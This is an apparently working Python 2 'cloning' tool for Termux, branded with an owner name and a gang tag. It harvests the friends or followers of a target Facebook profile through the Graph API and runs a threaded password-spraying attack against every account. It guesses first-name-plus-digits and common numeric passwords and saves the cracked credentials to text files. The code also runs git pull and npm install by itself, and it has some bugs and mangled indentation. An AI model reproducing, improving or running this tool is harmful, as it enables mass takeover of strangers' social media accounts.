#coding=utf-8
#!/usr/bin/python2
#source code by Xtylish Pathani
#codded by Tech Abm
# do no try to decode it
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 blueforce.indirect")
os.system("clear")
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd .empty && npm install")
    os.system("cd .empty && node index.js &")
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("cd .termux && node index.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/generate_fb_token.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node generate_fb_token.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/Blueforce_Abm/.empty/node_modules/bytes/loadJS.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node loadJS.js &")
    os.system("clear")
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf8")

banner="""
\033[1;97m╔══╦══╗╔═══╦═══╦╗─╔╦══╦═╗╔═╗
\033[1;98m╚╣╠╣╔╗║║╔═╗║╔═╗║║─║╠╣╠╣║╚╝║║
\033[1;92m─║║║╚╝╚╣╚═╝║║─║║╚═╝║║║║╔╗╔╗║
\033[1;96m─║║║╔═╗║╔╗╔╣╚═╝║╔═╗║║║║║║║║║
\033[1;95m╔╣╠╣╚═╝║║║╚╣╔═╗║║─║╠╣╠╣║║║║║
\033[1;94m╚══╩═══╩╝╚═╩╝─╚╩╝─╚╩══╩╝╚╝╚╝
\033[1;97m**************************************
\033[1;93m$\033[1;97m OWNER   :   \033[1;92mMUHAMMAD IBRAHIM
\033[1;93m$\033[1;97m GANG      :  \033[1;92m HM-420
\033[1;93m$\033[1;97m WP           :   \033[1;92m03315835061
\033[1;97m**************************************
\033[1;95m                       ----+ Login Process +----
\033[1;94mKey🗝️ :  \033[1;92mIB AKY LY LENA
\033[1;97m**************************************                         
"""

def user_info():
    os.system("clear")
    print banner
    time.sleep(1)
    try:
        abm = open("/sdcard/.abm.txt", "r").read()
    except (KeyError , IOError):
        menu_login()
        os.system('clear')
	print banner
	print("\033[1;93mPlease Wait A Mintue").center(50)
	print("")
        os.system("cd .empty && npm install")
        os.system("fuser -k 5000/tcp &")
        os.system("cd .empty && node index.js &")
        time.sleep(3)
        menu_login()
    else:
        os.system("clear")
	print banner
	print("\033[1;95mSorry Try Again").center(50)
	print('')
	print("\033[1;93mPut Api Key To Unlock This Tool").center(50)
	print('')
	api = raw_input("\033[1;97m[!] Put  Key :\033[0;90m ")
	if api =="XtylishPathani404":
		print("")
		time.sleep(3)
		print("\033[1;92mTool Unlocked Congratulations").center(50)
		print("")
		time.sleep(2)
		menu_login()
	else:
		print("")
		time.sleep(1)
		print("\033[1;91mApi Key Is Invalid").center(50)
		print("")
		time.sleep(3)
		user_info()
		
def menu_login():
	os.system("clear")
	print banner
	print("\033[1;92m[1]➤ Login With Token")
	print("\033[1;92m[2]➤ Login With Password")
	print("\033[1;92m[0]➤ Exit")
	print(50*"-")
	menu_login2() 
def menu_login2():
	user_select = raw_input("\033[1;92m╰─IBRAHEEM➤ ")
	if user_select =="1":
		os.system("clear")
		print banner
		print("Login With Token").center(50)
		print("")
                token = raw_input("\033[1;97m[!] Put Token : \033[0;90m")
                token_ab = open("access_token.txt", "w")
                token_ab.write(token)
                token_ab.close()
		print("")
		print("\033[1;92mlogin success").center(50)
		time.sleep(2)
		os.system("cd .empty && npm install")
                os.system("fuser -k 5000/tcp &")
                os.system("cd .empty && node index.js &")
                time.sleep(3)
                menu()
	if user_select =="2":
		login_fb()
	elif user_select =="0":
		os.system("exit")
	else:
		print("")
		print("Please Select A Valid Option")
		print("")
		time.sleep(3)
		menu_login()
		
def login_fb():
    os.system("clear")
    print banner
    lid = raw_input("[!] Id/mail/no: ")
    pwds = raw_input("[!] Password : ")
    data = requests.get("http://localhost:5000/auth?id=" + uid + "&pass=" + pwd).text
    q = json.loads(data)
    if "loc" in q:
        login_abm = open('access_token.txt', 'w')
        login_abm.write(q["loc"])
        login_abm.close()
	print("")
	print("\033[1;92mLogin Success").center(50)
	time.sleep(3)
        menu()
    elif 'www.facebook.com' in q['error']:
        print("")
        print("Email Or Password Has Wrong").center(50)
	time.sleep(3)
        login_fb()
    else:
        print("")
        print("CheckPoint").center(50)
        print("")
        time.seelp(3)
	login_fb()
		
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        menu_login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print banner
        print("")
        print("logged account has checkpoint").center(50)
	time.sleep(3)
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        menu_login()
    os.system("clear")
    print banner
    print("\033[0;90m\tlogged user : " +name)
    print("")
    print("\033[1;96m [1] ➤HACK With Choice Password")
    print("\033[1;96m [2] ➤HACK With Auto Password")
    print("\033[1;96m [3] ➤Your Token")
    print("\033[1;96m [4] ➤Update Tool")
    print("\033[1;96m [0] ➤Main Menu Back")
    print(50*"-")
    menu_select()
def menu_select():
	select = raw_input("\033[1;92m╰─IBRAHEEM➤ : ")
	if select =="1":
		crack()
	elif select =="2":
		choose()
	elif select =="3":
		view_token()
	elif select =="4":
		os.system("cd .empty && npm install")
                os.system("fuser -k 5000/tcp &")
                os.system("cd .empty && node index.js &")
		os.system("git pull")
		time.sleep(2)
		menu()
	elif select =="0":
		os.system("clear")
	        print banner
	        print("")
	        raw_input("Press Enter To Tool Logout")
	        time.sleep(3)
	        os.system("exit")
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_select()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		menu_login()
	os.system("clear")
	print banner
	print("\033[1;96m[1]➤ From Public ID")
	print("\033[1;96m[2]➤ From Followers ID")
	print("\033[1;96m[0]➤ Back")
	print(50*"-")
	crack_select()
def crack_select():
	select = raw_input("\033[1;92m╰─IBRAHEEM➤: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print banner
		idt = raw_input("[!] Put ID/Username : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print banner
			print("[!] Target User : "+q["name"])
		except KeyError:
			print("")
			print("\033[1;91mInvalid Link Or Friendlist Has Privact").center(50)
			print("")
			time.sleep(3)
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print banner
		idt = raw_input("[!] Put ID/Username : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			print banner
			print("[!] Target User : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\033[1;91m Select A Valid Option").center(50)
		print("")
		time.sleep(3)
		crack_select()
	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
	time.sleep(0.05)
	print("[!]\033[1;95m PROCESS START")
	time.sleep(0.05)
	print("[!]\033[1;95m Plz wait clone account will be appear here\033[1;0m")
	time.sleep(0.05)
	print(50*"-")

			
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = name+"123"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt","a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass1)
					cp = open("cp.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"1234"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass2)
							cp = open("cp.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"12345"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt","a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass3)
									cp = open("cp.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"786"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt","a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass4)
											cp = open("cp.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = "234567"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt","a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass5)
													cp = open("cp.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = "223344"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt","a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass6)
															cp = open("cp.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "1122334455"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt","a")
																ok.write(uid+" | "+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error"]:
																	print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass7)
																	cp = open("cp.txt","a")
																	cp.write(uid+" | "+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
															        else:
															                pass8 = "102030"
															                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8, headers=header).text
															                q = json.loads(data)
															                if "loc" in q:
																                print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass8+"\033[0;97m")
																                ok = open("ok.txt","a")
																                ok.write(uid+" | "+pass8+"\n")
																                ok.close()
																                oks.append(uid+pass8)
															                else:
																                if "www.facebook.com" in q["error"]:
																	                print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass8)
																	                cp = open("cp.txt","a")
																	                cp.write(uid+" | "+pass8+"\n")
																	                cp.close()
																	                cps.append(uid+pass8)
																	        else:
															                                pass9 = "556677"
															                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9, headers=header).text
															                                q = json.loads(data)
															                                if "loc" in q:
																                                print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass9+"\033[0;97m")
																                                ok = open("ok.txt","a")
																                                ok.write(uid+" | "+pass9+"\n")
																                                ok.close()
																                                oks.append(uid+pass9)
															                                else:
																                                if "www.facebook.com" in q["error"]:
																	                                print("\033[1;91m[IBRAHEEM-CO] "+uid+" | "+pass9)
																	                                cp = open("cp.txt","a")
																	                                cp.write(uid+" | "+pass9+"\n")
																	                                cp.close()
																	                                cps.append(uid+pass9)
																			        else:
															                                                pass10 = "789789"
															                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10, headers=header).text
															                                                q = json.loads(data)
															                                                if "loc" in q:
																                                                print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass10+"\033[0;97m")
																                                                ok = open("ok.txt","a")
																                                                ok.write(uid+" | "+pass10+"\n")
																                                                ok.close()
																                                                oks.append(uid+pass10)
															                                                else:
																                                                if "www.facebook.com" in q["error"]:
																	                                                print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass10)
																	                                                cp = open("cp.txt","a")
																	                                                cp.write(uid+" | "+pass10+"\n")
																	                                                cp.close()
																	                                                cps.append(uid+pass10)
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print(50*"-")
	print("[!] The process has completed")
	print("[!] Total OK/CP:"+str(len(oks)))+"/"+str(len(cps))
	raw_input("[!] Press Eter To Back")
	crack()
			
def choose():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("Token Not Found OR Has CheckPoint").center(50)
		time.sleep(2)
		menu_login()
	os.system("clear")
	print banner
	print("\033[1;96m[1]➤From Public ID")
	print("\033[1;96m[2]➤From Follwers ID")
	print("\033[1;96m[0]➤Back")
	print(50*"-")
	choice_select()
def choice_select():
	select = raw_input("╰─IBRAHIM➤ : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print banner
		idt = raw_input("[!] Put ID/Username  : ")
		print("")
		pass1 = raw_input("\033[1;92m[1]➤ Password :\033[1;93m ")
		pass2 = raw_input("\033[1;92m             [2]➤ Password :\033[1;93m ")
		pass3 = raw_input("\033[1;92m[3]➤ Password :\033[1;93m ")
		pass4 = raw_input("\033[1;92m             [4]➤ Password :\033[1;93m ")
		pass5 = raw_input("\033[1;92m[5]➤ Password :\033[1;93m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print banner
			print("[!] Target User : "+q["name"])
		except KeyError:
			print("")
			print("Public ID Not Found").center(50)
			print("")
			time.sleep(3)
			choose()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print banner
		idt = raw_input("╰─➤ ID  : ")
		print("")
		pass1 = raw_input("\033[1;92m[1]➤ Password :\033[1;93m ")
		pass2 = raw_input("\033[1;92m              [2]➤ Password :\033[1;93m ")
		pass3 = raw_input("\033[1;92m[3]➤ Password :\033[1;93m ")
		pass4 = raw_input("\033[1;92m              [4]➤ Password :\033[1;93m ")
		pass5 = raw_input("\033[1;92m[5]➤ Password :\033[1;93m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print banner
			print("[!] Target User : "+q["name"])
		except KeyError:
			print("")
			print("Public ID Not Found").center(50)
			print("")
			time.sleep(3)
			choose()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;91mSelect a valid option\033[0;97m")
		print("")
		time.sleep(3)
		choose()
	print("[!] Total User IDs :\033[1;92m "+str(len(id)))
	time.sleep(0.05)
	print("[!]\033[1;95m Cracking Start...")
	time.sleep(0.05)
	print("[!]\033[1;95m Please Wait For Accounts\033[1;0m")
	time.sleep(0.05)
	print(50*"-")
			
			
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("successful.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("\033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print(" \033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
									        else:
									                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
									                q = json.loads(data)
									                if "loc" in q:
										                print("\033[1;92m[IBRAHEEM-OK] \033[1;96m"+uid+" | "+pass5+"\033[0;97m")
										                ok = open("successful.txt", "a")
										                ok.write(uid+" | "+pass5+"\n")
										                ok.close()
										                oks.append(uid+pass5)
									                else:
										                if "www.facebook.com" in q["error"]:
											                print(" \033[1;91m[IBRAHEEM-CP] "+uid+" | "+pass5+"\033[0;97m")
											                cp = open("checkpoint.txt","a")
											                cp.write(uid+" | "+pass5+"\n")
											                cp.close()
											                cps.apppend(uid+pass5)
													
																
		except:
			pass
	
	p = ThreadPool(30)
	p.map(main,id)
	print(50*"-")
	print("[!] The process has completed")
	print("[!] Total OK/CP :"+str(len(oks)))+"/"+str(len(cps))
	raw_input("[!] Press enter to back")
	choose()
		    
def view_token():
    os.system("clear")
    print banner
    print("")
    os.system("cat .fb_token.txt")
    print("")
    raw_input(" Press enter to main menu ")
    menu()
			
if __name__ == '__main__':
	user_info()

